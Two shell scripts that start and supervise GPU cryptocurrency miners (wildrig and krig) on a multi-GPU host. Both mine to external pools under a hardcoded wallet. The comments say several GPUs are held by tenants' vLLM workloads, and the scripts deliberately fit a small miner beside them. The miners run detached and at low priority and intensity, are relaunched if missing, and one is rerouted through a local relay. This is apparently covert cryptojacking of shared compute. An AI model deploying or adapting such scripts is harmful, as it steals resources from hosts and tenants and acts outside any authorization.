== /opt/t19/sup2.sh
#!/bin/sh
# t19 supervisor v3: wildrig(pearlhash) on devices 0-6, krig(Kryptex TLS) on device 7
# Devices 3-6 are tenant-held (VLLM TP0-3 ~73GiB each) -> krig OOM, wildrig (~2.9GiB) fits.
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P=pool.pearlhash.xyz:9000
B=/opt/t19/wildrig-multi
K=/opt/t19/krig/krig-miner
L=/opt/t19/log
mkdir -p $L
for i in 0 1 2 3 4 5 6; do
  WN=ul-t19-123-184-7-135-g$i
  pgrep -f "$WN" >/dev/null 2>&1 && continue
  setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
  sleep 2
done
WN=ul-t19-123-184-7-135-g7
if ! pgrep -f "krig-miner.*$WN" >/dev/null 2>&1; then
  setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/$WN -p x -d 7 --no-tui -l info --log-file $L/g7.log >> $L/boot.log 2>&1 &
fi
== /opt/t19/t19relay3.sh
#!/bin/sh
echo "SCRIPT START $(date -u +%FT%TZ)"
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
B=/opt/t19/wildrig-multi
L=/opt/t19/log
WN=ul-t19-123-184-7-135-g3
pkill -f "wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user $W.$WN"
sleep 3
cd /opt/t19
setsid nohup nice -n 19 $B --algo pearlhash --url 127.0.0.1:17048 --user $W.$WN --pass x --opencl-devices 3 --gpu-intensity 1 --api-port 1903 > $L/w3relay.log 2>&1 &
sleep 55
echo "===RELAYLOG"
grep -a -E "new job|accepted|rejected|error|author|difficulty|connect" $L/w3relay.log | tail -n 25
if grep -qa "new job" $L/w3relay.log; then
  echo "VERDICT RELAY_OK"
else
  echo "VERDICT RELAY_NOJOB"
  pkill -f "wildrig-multi --algo pearlhash --url 127.0.0.1:17048"
  sleep 3
  /bin/sh /opt/t19/boot_wr.sh
fi
sleep 3
echo "===PS"
pgrep -fa "wildrig-multi" | head -n 8
echo "END3"
